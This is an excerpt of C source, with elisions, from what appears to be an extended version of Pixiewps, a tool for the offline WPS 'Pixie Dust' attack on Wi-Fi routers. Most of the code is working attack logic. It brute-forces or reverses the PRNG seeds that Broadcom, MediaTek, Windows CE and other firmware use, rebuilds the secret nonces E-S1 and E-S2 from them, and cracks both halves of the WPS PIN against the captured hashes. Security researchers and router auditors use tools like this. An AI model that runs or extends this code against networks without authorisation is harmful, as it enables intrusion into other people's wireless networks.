...
static inline uint32_t broadcom_rand(uint32_t *seed);
static inline uint32_t xorshift32_rand(uint32_t *seed);
static inline uint8_t wince_lcg_rand(uint32_t *seed);
static inline uint8_t numrecipes_lcg_rand(uint32_t *seed);
...
/* Zero memory in a way that won't be optimized away by the compiler */
...
/* Centralized cleanup: zero sensitive key material then free all fields */
static void wps_free(struct global *wps)
{
    if (!wps)
        return;

    if (wps->authkey)   { secure_zero(wps->authkey, WPS_AUTHKEY_LEN);     free(wps->authkey); }
    if (wps->psk1)      { secure_zero(wps->psk1, WPS_HASH_LEN);          free(wps->psk1); }
    if (wps->psk2)      { secure_zero(wps->psk2, WPS_HASH_LEN);          free(wps->psk2); }
    if (wps->empty_psk) { secure_zero(wps->empty_psk, WPS_HASH_LEN);     free(wps->empty_psk); }
    if (wps->e_s1)      { secure_zero(wps->e_s1, WPS_SECRET_NONCE_LEN);  free(wps->e_s1); }
    if (wps->e_s2)      { secure_zero(wps->e_s2, WPS_SECRET_NONCE_LEN);  free(wps->e_s2); }
    if (wps->dhkey)     { secure_zero(wps->dhkey, WPS_HASH_LEN);         free(wps->dhkey); }
    if (wps->kdk)       { secure_zero(wps->kdk, WPS_HASH_LEN);           free(wps->kdk); }
    if (wps->wrapkey)   { secure_zero(wps->wrapkey, WPS_KEYWRAPKEY_LEN); free(wps->wrapkey); }
    if (wps->emsk)      { secure_zero(wps->emsk, WPS_EMSK_LEN);          free(wps->emsk); }
    ...
    free(wps->r_nonce);
    free(wps->e_bssid);
    if (wps->e_key) { secure_zero(wps->e_key, WPS_PKEY_LEN); free(wps->e_key); }
    free(wps->m5_encr);
    free(wps->m7_encr);
    free(wps->error);
    free(wps->warning);

    secure_zero(wps->pin, sizeof(wps->pin));
    free(wps);
}
...
static struct job_control {
    ...
    volatile int nonce_found; /* 1 when seed found (disambiguates seed value 0) */
} job_control;
...
/*
 * MediaTek MT76xx LFSR - evolved from Ralink with different feedback polynomial.
 * MT7620/MT7628 use polynomial 0x80000062 instead of Ralink's 0x80000057.
 */
struct mediatek_randstate {
    uint32_t sreg;
};

static unsigned char mediatek_randbyte(struct mediatek_randstate *state)
{
    unsigned char r = 0;
    for (int i = 0; i < 8; i++) {
        unsigned char result;
        if (state->sreg & 0x00000001) {
            state->sreg = ((state->sreg ^ 0x80000062) >> 1) | 0x80000000;
            result = 1;
        }
        else {
            state->sreg = state->sreg >> 1;
...
static void mediatek_randstate_restore(struct mediatek_randstate *state, uint8_t r)
{
    for (int i = 0; i < 8; i++) {
        const unsigned char result = r & 1;
        r = r >> 1;
        if (result) {
            state->sreg = (((state->sreg) << 1) ^ 0x80000062) | 0x00000001;
        }
        else {
            state->sreg = state->sreg << 1;
        }
...
static unsigned char mediatek_randbyte_backwards(struct mediatek_randstate *state)
{
    unsigned char r = 0;
    for (int i = 0; i < 8; i++) {
        unsigned char result;
...
/*
 * Broadcom BCM43xx/WICED LCG - used in Broadcom-based WPS implementations.
 * Multiplier 0x6C078965 (1812433253), increment 1.
 * Nonce bytes extracted from low 8 bits of each LCG output.
 */
static inline uint32_t broadcom_rand(uint32_t *seed)
{
...
static int crack_bcm(uint32_t start, uint32_t end, uint32_t *result)
{
    uint32_t index;
    unsigned char *search_nonce = (void *)job_control.randr_enonce;
    ...
    for (index = start; index < end; index++) {
        int i;
        uint32_t seed = index;
        if ((uint8_t)(broadcom_rand(&seed)) != search_nonce[0]) continue;
        for (i = 1; i < 4; i++) {
            if ((uint8_t)(broadcom_rand(&seed)) != search_nonce[i])
                break;
        }
        if (i < 4) continue;
        for (i = 4; i < WPS_NONCE_LEN; i++) {
            if ((uint8_t)(broadcom_rand(&seed)) != search_nonce[i])
                break;
        }
        if (i == WPS_NONCE_LEN) {
...
static void crack_thread_bcm(struct crack_job *j)
{
    uint32_t start = j->start, end;
    uint32_t res;
...
/*
 * Mersenne Twister MT19937 - full implementation.
 * Used as alternative Broadcom mode (mode 8) where the 0x6C078965 constant
 * is the MT initialization multiplier rather than a standalone LCG.
 */
#define MT_N 624
#define MT_M 397
...
static void mt19937_init(struct mt19937_state *s, uint32_t seed)
{
    s->mt[0] = seed;
    for (int i = 1; i < MT_N; i++)
        s->mt[i] = (0x6C078965u * (s->mt[i - 1] ^ (s->mt[i - 1] >> 30)) + (uint32_t)i);
    s->index = MT_N;
}

static void mt19937_twist(struct mt19937_state *s)
{
    for (int i = 0; i < MT_N; i++) {
        uint32_t y = (s->mt[i] & MT_UPPER_MASK) | (s->mt[(i + 1) % MT_N] & MT_LOWER_MASK);
        s->mt[i] = s->mt[(i + MT_M) % MT_N] ^ (y >> 1);
        if (y & 1u)
            s->mt[i] ^= MT_MATRIX_A;
    }
    s->index = 0;
...
static inline uint32_t mt19937_extract(struct mt19937_state *s)
{
    if (s->index >= MT_N)
        mt19937_twist(s);
...
static int crack_bcm_mt(uint32_t start, uint32_t end, uint32_t *result)
{
    unsigned char *search_nonce = (void *)job_control.randr_enonce;

    for (uint32_t index = start; index < end; index++) {
        struct mt19937_state mt;
        mt19937_init(&mt, index);
        int i;
        if ((uint8_t)(mt19937_extract(&mt)) != search_nonce[0]) continue;
        for (i = 1; i < 4; i++) {
            if ((uint8_t)(mt19937_extract(&mt)) != search_nonce[i])
                break;
        }
        if (i < 4) continue;
        for (i = 4; i < WPS_NONCE_LEN; i++) {
...
static void crack_thread_bcm_mt(struct crack_job *j)
{
    uint32_t start = j->start, end;
    uint32_t res;
...
/*
 * XorShift32 (Marsaglia) - common in embedded firmware as fast random replacement.
 * Period: 2^32 - 1. Seed must not be 0 (fixed point).
 */
static inline uint32_t xorshift32_rand(uint32_t *seed)
{
    uint32_t x = *seed;
...
/*
 * Windows CE / Embedded Compact LCG.
 * Multiplier: 214013 (0x343FD), increment: 2531011 (0x269EC3).
 * Output: (state >> 16) & 0xFF per byte.
 */
static inline uint8_t wince_lcg_rand(uint32_t *seed)
{
 ...
 * Output: low 8 bits of state per byte.
 */
static inline uint8_t numrecipes_lcg_rand(uint32_t *seed)
{
...
/*
 * Macro to generate threaded crack/thread function pairs for byte-oriented PRNGs.
 * Each PRNG only differs in the rand call; the search and thread logic is identical.
 */
#define DEFINE_CRACK_FUNCS(name, rand_fn) \
static int crack_##name(uint32_t start, uint32_t end, uint32_t *result) \
{ \
    unsigned char *search_nonce = (void *)job_control.randr_enonce; \
    for (uint32_t index = start; index < end; index++) { \
        int i; \
        uint32_t seed = index; \
        if ((uint8_t)(rand_fn(&seed)) != search_nonce[0]) continue; \
        for (i = 1; i < 4; i++) { \
            if ((uint8_t)(rand_fn(&seed)) != search_nonce[i]) \
                break; \
        } \
        if (i < 4) continue; \
        for (i = 4; i < WPS_NONCE_LEN; i++) { \
...
static void crack_thread_##name(struct crack_job *j) \
{ \
    uint32_t start = j->start, end; \
    uint32_t res; \
    while (!job_control.nonce_found) { \
...
DEFINE_CRACK_FUNCS(ecos_simplest, ecos_rand_simplest)
DEFINE_CRACK_FUNCS(ecos_knuth, ecos_rand_knuth)
DEFINE_CRACK_FUNCS(xorshift, xorshift32_rand)
DEFINE_CRACK_FUNCS(wince, wince_lcg_rand)
DEFINE_CRACK_FUNCS(numrecipes, numrecipes_lcg_rand)
...
static void *crack_thread(void *arg)
{
    ...
    else if (job_control.mode == BROADCOM)
        crack_thread_bcm(j);
    else if (job_control.mode == BROADCOM_MT)
        crack_thread_bcm_mt(j);
    else if (job_control.mode == ECOS_SIMPLEST)
        crack_thread_ecos_simplest(j);
    else if (job_control.mode == ECOS_KNUTH)
        crack_thread_ecos_knuth(j);
    else if (job_control.mode == XORSHIFT32)
        crack_thread_xorshift(j);
    else if (job_control.mode == WINCE_LCG)
        crack_thread_wince(j);
    else if (job_control.mode == NUMRECIPES_LCG)
        crack_thread_numrecipes(j);
    else
        assert(0);
...
static void init_crack_jobs(struct global *wps, int mode)
{
    ...
    else if (mode == XORSHIFT32) curr = 1; /* XorShift: seed 0 is a fixed point */
...
static int collect_crack_jobs(uint32_t *out_seed)
{
    ...
    *out_seed = job_control.nonce_seed;
    return job_control.nonce_found;
}
...
static void crack_thread_rtl_es(struct crack_job *j)
{
    ...
    for (dist = thread_id; !job_control.nonce_found && dist < max_dist; dist += job_control.jobs) {
            ...
            case  0 :
                if (!strcmp("help", long_options[long_index].name)) {
                    fprintf(stderr, v_usage, SHORT_VERSION,
                        ...
                        p_mode_name[BROADCOM],
                        p_mode_name[MEDIATEK],
                        p_mode_name[BROADCOM_MT],
                        p_mode_name[XORSHIFT32],
                        p_mode_name[WINCE_LCG],
                        p_mode_name[NUMRECIPES_LCG]
                    );
                    free(wps->error);
                    free(wps);
                    return ARG_ERROR;
...
usage_err:
    ...
    if (wps->m7_encr) {
        ...
        secure_zero(wps->e_key, WPS_PKEY_LEN); free(wps->e_key); wps->e_key = NULL;
        ...
        free(wps->m7_encr); wps->m7_encr = NULL;
        if (!decrypted7) {
            printf("\n Pixiewps %s\n", SHORT_VERSION);
        ...
        if (wps->m5_encr) {
            ...
            free(wps->m5_encr); wps->m5_encr = NULL;
            if (!decrypted5) {
                printf("\n Pixiewps %s\n", SHORT_VERSION);
                printf("\n [x] Unexpected error while decrypting (--m5-enc)!\n\n");
                secure_zero(decrypted7, wps->m7_encr_len - 16); free(decrypted7);
                free(buffer);
                wps_free(wps);
                return UNS_ERROR;
            }
        ...
        if (decrypted5) { secure_zero(decrypted5, wps->m5_encr_len - 16); free(decrypted5); }
        secure_zero(decrypted7, wps->m7_encr_len - 16); free(decrypted7);
        free(buffer);
        wps_free(wps);
...

    {
        ...
        size_t offset = 0;
        modes_buf[0] = '\0';
        for (int mi = 0; mi < MODE_LEN && p_mode[mi] != NONE; mi++) {
            int written = snprintf(modes_buf + offset, sizeof(modes_buf) - offset,
                "%s%d (%s)", (mi == 0) ? "" : ", ",
                p_mode[mi], p_mode_name[p_mode[mi]]);
            if (written < 0 || (size_t)written >= sizeof(modes_buf) - offset)
                break;
            offset += (size_t)written;
        }
        DEBUG_PRINT("Modes: %s", modes_buf);
    }
    ...
    if (!wps->authkey) {
        ...
        if (wps->verbosity > 2) { /* Keep the keys to show later on exit */
            ...
            free(wps->dhkey); wps->dhkey = NULL;
            free(wps->kdk);   wps->kdk = NULL;
        }
    }
    ...
    while (found_p_mode == NONE && k < MODE_LEN && p_mode[k] != NONE) {
            ...
            if (found_p_mode == NONE) {
                if (wps->small_dh_keys || check_small_dh_keys(wps->pkr)) {
                    ...
                    if (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
                        ...
                        if (collect_crack_jobs(&wps->nonce_seed)) { /* Seed found */
        ...
        /* 4 */
            ...
            init_crack_jobs(wps, ECOS_SIMPLEST);

            if (collect_crack_jobs(&wps->nonce_seed)) {
                int i;
                uint32_t seed = wps->nonce_seed;

                for (i = 0; i < WPS_NONCE_LEN; i++)
                    ecos_rand_simplest(&seed);
        ...
        /* 5 */
            ...
            init_crack_jobs(wps, ECOS_KNUTH);
        ...
        /* 6 - Broadcom BCM43xx multi-threaded LCG seed search */
        }
        else if (p_mode[k] == BROADCOM && wps->e_nonce) {

            DEBUG_PRINT(" * Mode: %d (%s)", BROADCOM, p_mode_name[BROADCOM]);

            init_crack_jobs(wps, BROADCOM);

            if (collect_crack_jobs(&wps->nonce_seed)) { /* Seed found, advance PRNG past nonce to get E-S1/E-S2 */
                int i;
                uint32_t seed = wps->nonce_seed;

                for (i = 0; i < WPS_NONCE_LEN; i++) /* Skip nonce bytes */
                    broadcom_rand(&seed);

                wps->s1_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s1[i] = (uint8_t)(broadcom_rand(&seed));

                wps->s2_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s2[i] = (uint8_t)(broadcom_rand(&seed));

                DEBUG_PRINT("Seed found (%10u)", wps->nonce_seed);
                DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
                if (crack(wps, wps->pin) == PIN_FOUND) {
                    found_p_mode = BROADCOM;
                    DEBUG_PRINT("Pin found (%8s)", wps->pin);
                }
                else {
                    wps->nonce_match = BROADCOM;
                    wps->nonce_seed = 0;
                    wps->s1_seed = 0;
                    wps->s2_seed = 0;
                }
        ...
        /* 7 - MediaTek MT76xx LFSR reversal (same structure as RT, different polynomial) */
        }
        else if (p_mode[k] == MEDIATEK && wps->e_nonce) {

            DEBUG_PRINT(" * Mode: %d (%s)", MEDIATEK, p_mode_name[MEDIATEK]);

            struct mediatek_randstate prng = {0};
            for (int i = WPS_NONCE_LEN; i--; )
                mediatek_randstate_restore(&prng, wps->e_nonce[i]);
            const uint32_t saved_sreg = prng.sreg;

            int j;
            for (j = 0; j < WPS_NONCE_LEN; j++)
                if (mediatek_randbyte(&prng) != wps->e_nonce[j]) break;

            if (j == WPS_NONCE_LEN) {
                prng.sreg = saved_sreg;
                wps->nonce_seed = prng.sreg;
                for (int i = WPS_SECRET_NONCE_LEN; i--; )
                    wps->e_s2[i] = mediatek_randbyte_backwards(&prng);
                wps->s2_seed = prng.sreg;
                for (int i = WPS_SECRET_NONCE_LEN; i--; )
                    wps->e_s1[i] = mediatek_randbyte_backwards(&prng);
                wps->s1_seed = prng.sreg;

                DEBUG_PRINT("Seed found");
                DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
                if (crack(wps, wps->pin) == PIN_FOUND) {
                    found_p_mode = MEDIATEK;
                    DEBUG_PRINT("Pin found (%8s)", wps->pin);
                }
                else {
                    wps->nonce_match = MEDIATEK;
                    wps->nonce_seed = 0;
                    wps->s1_seed = 0;
                    wps->s2_seed = 0;
                }
        ...
        /* 8 - Broadcom MT19937 (full Mersenne Twister, multi-threaded seed search) */
        }
        else if (p_mode[k] == BROADCOM_MT && wps->e_nonce) {

            DEBUG_PRINT(" * Mode: %d (%s)", BROADCOM_MT, p_mode_name[BROADCOM_MT]);

            init_crack_jobs(wps, BROADCOM_MT);

            if (collect_crack_jobs(&wps->nonce_seed)) {
                int i;
                struct mt19937_state mt;
                mt19937_init(&mt, wps->nonce_seed);
                ...
                wps->s1_seed = 0;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s1[i] = (uint8_t)(mt19937_extract(&mt));

                wps->s2_seed = 0;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s2[i] = (uint8_t)(mt19937_extract(&mt));

                DEBUG_PRINT("Seed found (%10u)", wps->nonce_seed);
                DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
                if (crack(wps, wps->pin) == PIN_FOUND) {
                    found_p_mode = BROADCOM_MT;
                    DEBUG_PRINT("Pin found (%8s)", wps->pin);
                }
                else {
                    wps->nonce_match = BROADCOM_MT;
                    wps->nonce_seed = 0;
                    wps->s1_seed = 0;
                    wps->s2_seed = 0;
                }
        ...
        /* 9 - XorShift32 (Marsaglia) */
        }
        else if (p_mode[k] == XORSHIFT32 && wps->e_nonce) {

            DEBUG_PRINT(" * Mode: %d (%s)", XORSHIFT32, p_mode_name[XORSHIFT32]);

            init_crack_jobs(wps, XORSHIFT32);
            ...
            if (collect_crack_jobs(&wps->nonce_seed)) {
                ...
                for (i = 0; i < WPS_NONCE_LEN; i++)
                    xorshift32_rand(&seed);

                wps->s1_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s1[i] = (uint8_t) xorshift32_rand(&seed);

                wps->s2_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s2[i] = (uint8_t) xorshift32_rand(&seed);

                DEBUG_PRINT("Seed found (%10u)", wps->nonce_seed);
                DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
                if (crack(wps, wps->pin) == PIN_FOUND) {
                    found_p_mode = XORSHIFT32;
                    DEBUG_PRINT("Pin found (%8s)", wps->pin);
                }
                else {
                    wps->nonce_match = XORSHIFT32;
                    wps->nonce_seed = 0;
                    wps->s1_seed = 0;
                    wps->s2_seed = 0;
                }
        ...
        /* 10 - Windows CE LCG */
        ...
        else if (p_mode[k] == WINCE_LCG && wps->e_nonce) {

            DEBUG_PRINT(" * Mode: %d (%s)", WINCE_LCG, p_mode_name[WINCE_LCG]);

            init_crack_jobs(wps, WINCE_LCG);
            ...
            if (collect_crack_jobs(&wps->nonce_seed)) {
                ...
                wps->s1_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s1[i] = wince_lcg_rand(&seed);

                wps->s2_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s2[i] = wince_lcg_rand(&seed);

                DEBUG_PRINT("Seed found (%10u)", wps->nonce_seed);
                DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
                if (crack(wps, wps->pin) == PIN_FOUND) {
                    found_p_mode = WINCE_LCG;
                    DEBUG_PRINT("Pin found (%8s)", wps->pin);
                }
                else {
                    wps->nonce_match = WINCE_LCG;
                    wps->nonce_seed = 0;
                    wps->s1_seed = 0;
                    wps->s2_seed = 0;
                }
        ...
        /* 11 - Numerical Recipes LCG */
        }
        else if (p_mode[k] == NUMRECIPES_LCG && wps->e_nonce) {

            DEBUG_PRINT(" * Mode: %d (%s)", NUMRECIPES_LCG, p_mode_name[NUMRECIPES_LCG]);

            init_crack_jobs(wps, NUMRECIPES_LCG);
            ...
            if (collect_crack_jobs(&wps->nonce_seed)) {
                ...
                for (i = 0; i < WPS_NONCE_LEN; i++)
                    numrecipes_lcg_rand(&seed);

                wps->s1_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s1[i] = numrecipes_lcg_rand(&seed);

                wps->s2_seed = seed;
                for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
                    wps->e_s2[i] = numrecipes_lcg_rand(&seed);

                DEBUG_PRINT("Seed found (%10u)", wps->nonce_seed);
                DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
                if (crack(wps, wps->pin) == PIN_FOUND) {
                    found_p_mode = NUMRECIPES_LCG;
                    DEBUG_PRINT("Pin found (%8s)", wps->pin);
                }
                else {
                    wps->nonce_match = NUMRECIPES_LCG;
                    wps->nonce_seed = 0;
                    wps->s1_seed = 0;
                    wps->s2_seed = 0;
                }
    ...
    if (found_p_mode == NONE) {
        if (wps->nonce_match || (!memcmp(wps->e_nonce, "\x00\x00", 2) && !memcmp(wps->e_nonce + 4, "\x00\x00", 2)) ||
            ...
            found_p_mode == BROADCOM || found_p_mode == MEDIATEK ||
            found_p_mode == BROADCOM_MT || found_p_mode == XORSHIFT32 ||
            found_p_mode == WINCE_LCG || found_p_mode == NUMRECIPES_LCG) {
        printf(" " STR_CONTRIBUTE "\n\n");
    }
...
/* Layout: [ES (16)] [PSK (16)] [PKe (192)] [PKr (192)] = 416 bytes */
#define PIN_BUFFER_LEN (WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2)

/*
 * Return non-zero if pin half is correct, zero otherwise.
 * Buffer must be pre-filled: [es][???][pke][pkr] - only the PSK slot is updated.
 */
static int check_pin_half(const struct hmac_ctx *hctx, const char pinhalf[4], uint8_t *psk, uint8_t *buffer, const uint8_t *ehash)
{
    ...
    hmac_sha256_yield(hctx, buffer, PIN_BUFFER_LEN, result);

    return !memcmp(result, ehash, WPS_HASH_LEN);
}

/* Prepare a reusable hash buffer with es, pke, pkr pre-filled (PSK slot left for caller) */
static void prepare_pin_buffer(uint8_t *buffer, const uint8_t *es, const struct global *wps)
{
...
{
    uint8_t buffer[PIN_BUFFER_LEN];
    uint8_t result[WPS_HASH_LEN];

    prepare_pin_buffer(buffer, es, wps);
    memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->empty_psk, WPS_PSK_LEN);
    hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, PIN_BUFFER_LEN, result);
...
static int crack_first_half(struct global *wps, char *pin, const uint8_t *es1_override)
{
    *pin = 0;
    ...
    prepare_pin_buffer(buffer, es1, wps);
    ...
    for (first_half = 0; first_half < 10000; first_half++) {
        ...
        if (check_pin_half(&hc, pin, psk, buffer, wps->e_hash1)) {
...
static int crack_second_half(struct global *wps, char *pin)
{
    ...
    prepare_pin_buffer(buffer, wps->e_s2, wps);
    hmac_sha256_init(&hc, wps->authkey, WPS_AUTHKEY_LEN);
    ...
    for (second_half = 0; second_half < 1000; second_half++) {
        ...
        if (check_pin_half(&hc, s_pin, psk, buffer, wps->e_hash2)) {
